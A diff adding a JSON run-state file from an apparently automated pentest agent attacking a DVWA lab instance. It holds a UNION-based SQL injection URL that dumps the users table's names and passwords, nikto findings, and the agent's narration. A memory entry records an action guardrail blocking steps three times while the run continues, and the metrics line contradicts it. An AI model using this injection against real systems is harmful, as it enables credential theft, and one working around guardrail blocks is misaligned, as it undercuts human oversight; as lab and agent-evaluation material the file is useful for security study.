@@ -1,0 +1,660 @@
+{
+  "run_id": "a69e522bcd5c4c47a50eb6c4d4495120",
+  "generated_at": "2026-10-18T21:05:01+00:00",
+  "target": "172.28.0.3/login.php",
+  "phase_history": [
+    {
+      "timestamp": "2026-10-18T20:55:06+00:00",
+      "phase": "recon"
+    }
+  ],
+  "findings": [
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:cf4696c70364",
+      "cause_class": "curl",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 3,
+      "evidence": [
+        {
+          "timestamp": "20:58:28",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "cf4696c70364"
+    },
+    {
+      "id": "curl:172.28.0.3/login.php:71984fed7bb6",
+      "cause_class": "curl",
+      "target": "172.28.0.3/login.php",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "20:58:45",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "71984fed7bb6"
+    },
+    {
+      "id": "curl:172.28.0.3/login.php:339a5465218a",
+      "cause_class": "curl",
+      "target": "172.28.0.3/login.php",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:59:13",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "339a5465218a"
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli:de7fa27cd4d3",
+      "cause_class": "curl",
+      "target": "172.28.0.3/vulnerabilities/sqli",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:59:40",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "de7fa27cd4d3"
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:7f9b3ae4b223",
+      "cause_class": "curl",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 2,
+      "evidence": [
+        {
+          "timestamp": "21:00:38",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "7f9b3ae4b223"
+    },
+    {
+      "id": "server-banner:172.28.0.3/vulnerabilities/sqli/?id=1:Apache/2.4.25 (Debian)",
+      "cause_class": "server-banner",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "Server: Apache/2.4.25 (Debian)",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "Apache/2.4.25 (Debian)"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68)."
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Con",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Con",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Con"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissio",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissio",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissio"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/St",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/St",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/St"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Pol",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Pol",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Pol"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[013587] /vulnerabilities/sqli/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[750500] /vulnerabilities/sqli/help/: Directory indexing found. See: CWE-548",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[750500] /vulnerabilities/sqli/help/: Directory indexing found. See: CWE-548",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[750500] /vulnerabilities/sqli/help/: Directory indexing found. See: CWE-548"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[000045] /vulnerabilities/sqli/help/: Help directory should not be accessible.",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[000045] /vulnerabilities/sqli/help/: Help directory should not be accessible.",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[000045] /vulnerabilities/sqli/help/: Help directory should not be accessible."
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[750500] /vulnerabilities/sqli/source/: Directory indexing found. See: CWE-548",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[750500] /vulnerabilities/sqli/source/: Directory indexing found. See: CWE-548",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[750500] /vulnerabilities/sqli/source/: Directory indexing found. See: CWE-548"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[007342] /vulnerabilities/sqli/: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors dir",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[007342] /vulnerabilities/sqli/: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors dir",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[007342] /vulnerabilities/sqli/: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors dir"
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[007352] /vulnerabilities/sqli/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different ",
+      "cause_class": "nikto-finding",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1",
+      "generality": 0.25,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:01:57",
+          "tool": "nikto",
+          "exit_signal": "[007352] /vulnerabilities/sqli/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different ",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "[007352] /vulnerabilities/sqli/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different "
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:4bf5d2eb76e2",
+      "cause_class": "curl",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "21:03:09",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "4bf5d2eb76e2"
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:f0b24a7c7627",
+      "cause_class": "curl",
+      "target": "172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--",
+      "generality": 0.75,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "21:04:03",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "f0b24a7c7627"
+    }
+  ],
+  "open_items": [
+    {
+      "id": "pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1",
+      "cause_class": "dead-region",
+      "target": "172.28.0.3/login.php",
+      "generality": 0.25,
+      "state": "blocked",
+      "downstream": 3,
+      "evidence": [
+        {
+          "timestamp": "20:57:47",
+          "tool": "prune",
+          "exit_signal": "collapsed 2 dead nodes: curl:172.28.0.3/login.php:727d3bf103e1, pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1"
+    },
+    {
+      "id": "curl:172.28.0.3/login.php:cce9874635dd",
+      "cause_class": "curl",
+      "target": "172.28.0.3/login.php",
+      "generality": 0.75,
+      "state": "contested",
+      "downstream": 2,
+      "evidence": [
+        {
+          "timestamp": "20:57:57",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "cce9874635dd"
+    }
+  ],
+  "edges": [
+    {
+      "parent": "pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1+pruned:172.28.0.3/login.php:curl:172.28.0.3/login.php:727d3bf103e1",
+      "child": "curl:172.28.0.3/login.php:cce9874635dd",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.3/login.php:cce9874635dd",
+      "child": "curl:172.28.0.3/login.php:71984fed7bb6",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.3/login.php:71984fed7bb6",
+      "child": "curl:172.28.0.3/login.php:339a5465218a",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:cf4696c70364",
+      "child": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:7f9b3ae4b223",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:7f9b3ae4b223",
+      "child": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:4bf5d2eb76e2",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:4bf5d2eb76e2",
+      "child": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:f0b24a7c7627",
+      "weight": 1.0
+    }
+  ],
+  "memory_context": [
+    {
+      "id": "tool-failure:recon:blocked by action guardrail",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.0,
+      "age_s": 409.82285952568054,
+      "snippet": "blocked by action guardrail",
+      "hits": 3
+    },
+    {
+      "id": "narration:recon:i'll start the dvwa engagement by establishing an authenticated session, which i'll need both for the sqli demonstration",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 0.8,
+      "age_s": 409.82284808158875,
+      "snippet": "I'll start the DVWA engagement by establishing an authenticated session, which I'll need both for the SQLi demonstration",
+      "hits": 1
+    },
+    {
+      "id": "narration:recon:let me establish the dvwa session and verify it works by hitting the sqli lab.",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 0.8,
+      "age_s": 390.5222022533417,
+      "snippet": "Let me establish the DVWA session and verify it works by hitting the SQLi lab.",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/login.php:cce9874635dd",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 365.70661211013794,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:cf4696c70364",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 334.67347145080566,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "narration:recon:the session is confirmed. now let me dump the users table with a union-based payload.",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 0.8,
+      "age_s": 334.67345428466797,
+      "snippet": "The session is confirmed. Now let me dump the users table with a UNION-based payload.",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/login.php:71984fed7bb6",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 317.8086574077606,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/login.php:339a5465218a",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 289.7611117362976,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli:de7fa27cd4d3",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 262.7695481777191,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:7f9b3ae4b223",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 204.67819666862488,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "server-banner:172.28.0.3/vulnerabilities/sqli/?id=1:Apache/2.4.25 (Debian)",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10593175888062,
+      "snippet": "Server: Apache/2.4.25 (Debian)",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592317581177,
+      "snippet": "[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Con",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592103004456,
+      "snippet": "[013587] /vulnerabilities/sqli/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Con",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissio",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592150688171,
+      "snippet": "[013587] /vulnerabilities/sqli/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissio",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/St",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592198371887,
+      "snippet": "[013587] /vulnerabilities/sqli/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/St",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Pol",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592269897461,
+      "snippet": "[013587] /vulnerabilities/sqli/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Pol",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[013587] /vulnerabilities/sqli/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592341423035,
+      "snippet": "[013587] /vulnerabilities/sqli/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[750500] /vulnerabilities/sqli/help/: Directory indexing found. See: CWE-548",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592412948608,
+      "snippet": "[750500] /vulnerabilities/sqli/help/: Directory indexing found. See: CWE-548",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[000045] /vulnerabilities/sqli/help/: Help directory should not be accessible.",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592436790466,
+      "snippet": "[000045] /vulnerabilities/sqli/help/: Help directory should not be accessible.",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[750500] /vulnerabilities/sqli/source/: Directory indexing found. See: CWE-548",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592484474182,
+      "snippet": "[750500] /vulnerabilities/sqli/source/: Directory indexing found. See: CWE-548",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[007342] /vulnerabilities/sqli/: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors dir",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592460632324,
+      "snippet": "[007342] /vulnerabilities/sqli/: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors dir",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.3/vulnerabilities/sqli/?id=1:[007352] /vulnerabilities/sqli/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different ",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 125.10592555999756,
+      "snippet": "[007352] /vulnerabilities/sqli/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different ",
+      "hits": 1
+    },
+    {
+      "id": "narration:recon:i'll switch to sqlmap, which handles the session cookie more reliably than curl's cookie-jar handling. i'll bake the ses",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 0.8,
+      "age_s": 125.10589671134949,
+      "snippet": "I'll switch to sqlmap, which handles the session cookie more reliably than curl's cookie-jar handling. I'll bake the ses",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:4bf5d2eb76e2",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 53.65143942832947,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.3/vulnerabilities/sqli/?id=1%20union%20select%20null,null,(select%20group_concat(user,password)%20from%20users),null--:f0b24a7c7627",
+      "tier": "T3",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 0.0011196136474609375,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    }
+  ],
+  "metrics": {
+    "ok": true,
+    "tool_calls": 1,
+    "tool_failures": 0,
+    "guardrail_blocks": 0,
+    "extraction_fallbacks": 11,
+    "tokens_total": 11777
+  }
+}
